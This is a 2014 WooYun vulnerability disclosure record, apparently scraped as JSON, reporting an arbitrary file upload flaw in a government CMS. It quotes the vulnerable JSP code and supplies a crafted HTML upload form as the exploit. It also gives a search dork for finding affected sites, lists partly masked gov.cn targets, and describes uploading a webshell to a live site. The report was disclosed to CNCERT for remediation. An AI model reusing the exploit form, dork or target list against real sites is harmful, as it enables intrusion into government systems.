{"id": 3531, "wybug_id": "wooyun-2014-053969", "wybug_title": "某政府类CMS任意文件上传", "wybug_corp": "Cncert国家互联网应急中心", "wybug_author": "U神", "wybug_date": "2014-03-19 10:55", "wybug_open_date": "2014-06-17 10:55", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-30：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-05-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-17：\t细节向公众公开  简要描述：  详细说明：  #1.这套JSP的系统主要用于政府网站，该系统中某个上传功能没有对上传文件进行任何判断，导致可以上传任意文件到网站目录可getshell，我们来看看文件comm_front/tzzx/chooseImageTools.jsp代码：\n<%@ page contentType=\"text/html; charset=GBK\"%><%\tresponse.setHeader(\"Cache-Control\", \"no-cache\"); \tresponse.setHeader(\"Pragma\", \"no-cache\"); \tresponse.setDateHeader(\"Expires\", -1);  \tresponse.setDateHeader(\"max-age\", 0);        String flag = request.getParameter(\"flag\");%><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"><title></title><style type=\"text/css\"><!--body {\tmargin-left: 0px;\tmargin-top: 0px;\tmargin-right: 0px;\tmargin-bottom: 0px;}--></style><link href=\"../inc/css/cms.css\" rel=\"stylesheet\" type=\"text/css\"><link rel=\"stylesheet\" type=\"text/css\" href=\"../css/windows.css\"></head><script src=\"<%=request.getContextPath()%>/cms/inc/js/func.js\"></script><script language=\"javascript\">function send(){\tvar pattern=/\\.(doc|xls|txt)$/i;   //*只做了JS的验证\tvar filename = document.form1.file.value;\tvar fileRealName = filename.substring(filename.lastIndexOf('\\\\')+1,filename.lastIndexOf('.'));\tif(!pattern.test(filename)){\t\talert(\"这里只能上传后缀名为.doc,.xls,.txt的文件!\");\t\treturn;\t}\tdocument.all.form1.action=\"uploadImageFile_do.jsp?flag=<%=flag%>&uri=/&fileRealName=\"+fileRealName;\tdocument.all.form1.submit();}var selectedFileName;</script><body><table width=\"100%\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\" background=\"../images/uptp.gif\" style=\"border:2px solid #999999\">  <tr><td height=\"69\" style=\"padding:20\"><form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"form1\" target=\"hiddenFrm\"><span id=\"uploadFileDIV\" style=\"display:inline\">\t\t<input type=\"file\" name=\"file\" id=\"file\">\t<input type=\"button\" name=\"Submit2\" value=\"上传\" onClick=\"send()\"></span><!-- <input type=\"button\" value=\"重命名\" onClick=\"rename()\">--><!--<input type=\"button\" value=\"返回\" onClick=\"top.close()\" class=\"cms_button\">--></form></td></tr></table><iframe id=\"hiddenFrm\" name=\"hiddenFrm\" style=\"display:none\"></iframe></body></html>\ncomm_front/tzzx/uploadImageFile_do.jsp代码\n<%@ page language=\"java\" contentType=\"text/html; charset=GBK\" %><%@ page import=\"java.io.*,java.util.*\"%><%@ page import=\"org.apache.commons.fileupload.*\"%><%@ page import=\"com.chinacreator.cms.util.*\"%><jsp:useBean id=\"date\" scope=\"page\" class=\"net.fiyu.edit.TimeStamp\"/><!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=GBK\"><title></title></head><body><%String fileName = \"\";String count = request.getParameter(\"flag\");String fileRealName =request.getParameter(\"fileRealName\");try{\tresponse.setHeader(\"Cache-Control\", \"no-cache\"); \tresponse.setHeader(\"Pragma\", \"no-cache\"); \tresponse.setDateHeader(\"Expires\", -1);  \tresponse.setDateHeader(\"max-age\", 0);\t//建立一个临时目录\tFile temp = new File(application.getRealPath(\"/\")+\"cms\\\\siteResource\\\\temp\",System.currentTimeMillis()+\"\"+Math.random()); //建立文件的命令规则\ttemp.mkdirs(); \t \tString pathContext = null;\tString rootPath = \"\";\trootPath = request.getRealPath(\"/\");\trootPath = rootPath.replace('\\\\','/');\tpathContext = rootPath + \"/cms/siteResource/uploadfiles/tzzx\";\tif(pathContext==null || pathContext.trim().length()==0){%>\t\t<script language=\"javascript\">\t\t\talert(\"没有找到站点文件夹所在的路径!.\");\t\t</script><% \t\treturn;\t}\tString uri = request.getParameter(\"uri\");    \tFile parentFolder = null;\tif(uri!=null && uri.trim().length()!=0){\t\tparentFolder = new File(pathContext,uri);\t}else{\t\tparentFolder = new File(pathContext);\t}\t\tFileItemFactory fileitemfactory = new DefaultFileItemFactory(2048000,temp);\tFileUpload fu = new FileUpload(fileitemfactory);\tList fields = fu.parseRequest(request);\tint flag = 0;//校验客户端文件是否存在\tfor(int i=0;fields!=null&&i<fields.size();i++){\t\tFileItem file = (FileItem)fields.get(i);\t\tif(file.getInputStream().available() <= 0)\t\t{\t\t\tbreak;\t\t}\t\tflag++;\t\tif(!file.isFormField()){\t\t\t//建个文件用来获取名字\t\t\tString FileName=(String)date.Time_Stamp(); \t\t\tString fileBottom = file.getName();\t\t\tint index = fileBottom.lastIndexOf('.');\t\t\tfileBottom = fileBottom.substring(index);\t\t\tfileName = FileName + fileBottom;\t\t\tfileRealName = fileRealName + fileBottom ;\t\t\tFile tempFile = new File(FileName+fileBottom);\t\t\tFile f = new File(pathContext,tempFile.getName());\t\t\tif(f.exists()){\t\t\t\t\t\t\t\tout.println(\"<script language=\\\"javascript\\\">\");\t\t\t\tout.println(\"alert('文件已经存在,请在上传之前修改好文件名!');\");\t\t\t\tout.println(\"</script>\");\t\t\t\tFileUtil.deleteSubfiles(temp.getAbsolutePath());\t\t\t\tFileUtil.deleteFile(temp.getAbsolutePath());\t\t\t\treturn;\t\t\t\t}\t\t\tf.getParentFile().mkdirs();\t\t\tf.createNewFile();\t\t\tfile.write(f);\t\t}\t}\tFileUtil.deleteSubfiles(temp.getAbsolutePath());\tFileUtil.deleteFile(temp.getAbsolutePath());\tif(flag <= 0)\t{\t\tout.println(\"<script language=\\\"javascript\\\">\");\t\tout.println(\"alert('文件为空或不存在,请重新上传!');\");\t\tout.println(\"</script>\");\t\treturn;\t\t}}catch(Exception e){\tout.println(\"<script language=\\\"javascript\\\">\");\tout.println(\"alert('上传图片发生异常,异常为\"+e.getMessage()+\"');\");\tout.println(\"</script>\");\t\t\te.printStackTrace();}%><script type=\"text/javascript\">\t//parent.ToolsFrm.selectedFileName=fileName;\t//alert(parent.parent.ImageListFrm.location.reload());\t\talert(\"上传文件成功.\");\tparent.parent.theOpener.setImage(\"<%=fileName%>\",\"<%=count%>\");\tparent.parent.theOpener.setImage2(\"<%=fileRealName%>\",\"<%=count%>\");\ttop.close();</script></body></html>\n#2.从上面可看出，只在上传页面中做了JS判断文件的类型，服务端没有判断文件的类型，这样我们就可以禁用JS或者本地构造上传页面来上传任意文件，构造EXP如下：\n<form action=\"http://******/comm_front/tzzx/uploadImageFile_do.jsp?uri=/\" method=\"post\" name=\"uploadform\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"NewFile\"><input type=\"submit\"></form>\n   漏洞证明：  #3.该CMS主要用于政府类的，可以通过谷歌、百度、搜狗等搜索引擎来爬行存在该上传漏洞文件的网站，由于CMS的url根据网站名称和导航标题等随机因素来命名，还是静态页面导致特征比较难构造，但这里还是提供下：\ninurl:comm_frontinurl:comm_front/email\n通过搜索引擎，罗列了不少存在该漏洞的网站，请求通报修复该高危漏洞：\nhttp://www.***z.gov.cn/comm_front/tzzx/uploadImageFile_do.jsphttp://www.h***j.gov.cn/comm_front/tzzx/uploadImageFile_do.jsphttp://www.y***g.gov.cn/comm_front/tzzx/uploadImageFile_do.jsphttp://www.***m.gov.cn/comm_front/tzzx/uploadImageFile_do.jsphttp://www.***x.gov.cn/comm_front/tzzx/uploadImageFile_do.jsphttp://www.h***ri.gov.cn/comm_front/tzzx/uploadImageFile_do.jsphttp://www.h***3.com:81/comm_front/tzzx/uploadImageFile_do.jsphttp://www.n***.com/comm_front/tzzx/uploadImageFile_do.jsphttp://www.c***.gov.cn/comm_front/tzzx/uploadImageFile_do.jsphttp://www.j***c.com/comm_front/tzzx/uploadImageFile_do.jsphttp://www.h***y.gov.cn/comm_front/tzzx/uploadImageFile_do.jsphttp://www.c***a.gov.cn:88/comm_front/tzzx/uploadImageFile_do.jsphttp://www.x***y.cn:8080/creatorcms/comm_front/tzzx/uploadImageFile_do.jsphttp://www.h***s.com/comm_front/tzzx/uploadImageFile_do.jsphttp://h***s.com/comm_front/tzzx/uploadImageFile_do.jsphttp://www.n***y.gov.cn/comm_front/tzzx/uploadImageFile_do.jsphttp://www.h***.hunan.gov.cn/comm_front/tzzx/uploadImageFile_do.jsphttp://mweb.h***i.gov.cn/comm_front/tzzx/uploadImageFile_do.jsphttp://www.g***j.h***.gov.cn/comm_front/tzzx/uploadImageFile_do.jsphttp://www.h***z.com/comm_front/tzzx/uploadImageFile_do.jsphttp://r***.h***.gov.cn/comm_front/tzzx/uploadImageFile_do.jsphttp://www.h***s.com/comm_front/tzzx/uploadImageFile_do.jsphttp://www.h***ps.com/comm_front/tzzx/uploadImageFile_do.jsp\n#4.漏洞如何利用？我们以第一个网站做安全测试，通过我们构造的本地上传页面，上传一个JSP文件，然后通过源代码获取到文件名称。\n\n然后根据\"uploadImageFile_do.jsp\"代码可以看的出，上传的文件在“cms/siteResource/uploadfiles/tzzx/”目录下，结合我们获取的文件名，就知道文件地址是：\nhttp://**.gov.cn/cms/siteResource/uploadfiles/tzzx/*********.jsp\n\n\n\n\n   修复方案：  PS:本次仅测试了其一，由于使用同一款CMS，其它通用！测试的Shell已删除，求不跨省，请求Cncert尽快通报该漏洞通知网站管理员早日修复漏洞，少让政府网遭殃！--证书经验累积中......---   版权声明：转载请注明来源 U神@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-03-27 08:47 厂商回复： CNVD确认并复现所述多个实例情况，并提取CMS应用特征，根据测试结果，主要协调湖南分中心，由其后续协调当地软件生产厂商，并将所述测试得到的用例分别协调网站管理单位处置。rank 20+ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-19 11:29 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  先赞一个。    \n     2014-03-19 11:31 |    \t\tadm1n \t\t\t( 普通白帽子  |\t\t\t        Rank:216 漏洞数:66        | 只是一个渣渣而已。。。)\t\t \n  MARK    \n     2014-03-19 11:56 |    \t\th35h4n9 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 92后网络安全爱好者)\t\t \n  mark    \n     2014-03-19 11:56 |    \t\tChriSt \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:4        )\t\t \n  MARK    \n     2014-03-19 11:57 |    \t\t90_ \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:10        | 关注网络信息安全。)\t\t \n  任意上传，这个略叼。  少见了    \n     2014-03-19 12:23 |    \t\t野驴~ \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:2        | 充满强烈好奇心的菜鸟。)\t\t \n  啤酒饮料矿泉水，花生瓜子小板凳，前面让一让    \n     2014-03-19 12:28 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @cncert国家互联网应急中心 我去？cert赞了啊？看来很严重？    \n     2014-03-19 13:45 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  @wefgod 你想多了，他只是上错号了。。。。。    \n     2014-03-19 13:51 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @Coody 擦……    \n     2014-03-19 18:27 |    \t\t魇 \t\t\t( 普通白帽子  |\t\t\t        Rank:1207 漏洞数:104        | 传闻中魇是一个惊世奇男子，但是除了他华...)\t\t \n  @Coody cncert也有小号？    \n     2014-03-19 20:11 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  @魇 哈哈……    \n     2014-03-21 00:26 |    \t\t爱上襄阳 \t\t\t( 普通白帽子  |\t\t\t        Rank:345 漏洞数:86        | ...)\t\t \n  关注政府漏洞·    \n     2014-03-27 08:33 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @cncert国家互联网应急中心 求确认，马上要忽略了~    \n     2014-03-27 12:09 |    \t\t魇 \t\t\t( 普通白帽子  |\t\t\t        Rank:1207 漏洞数:104        | 传闻中魇是一个惊世奇男子，但是除了他华...)\t\t \n  @U神 现在忽略时间貌似改了？    \n     2014-03-27 12:27 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @魇 你知道是几天么？目测是7天    \n     2014-04-08 17:51 |    \t\thuc-ray \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:7        | 菜鸟一枚)\t\t \n  0.0    \n     2014-06-17 11:08 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  很吊的赶脚    \n     2014-06-17 11:39 |    \t\tloli  \t\t\t( 普通白帽子  |\t\t\t        Rank:550 漏洞数:52        )\t\t \n  多少经验才能有CERT证书啊。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}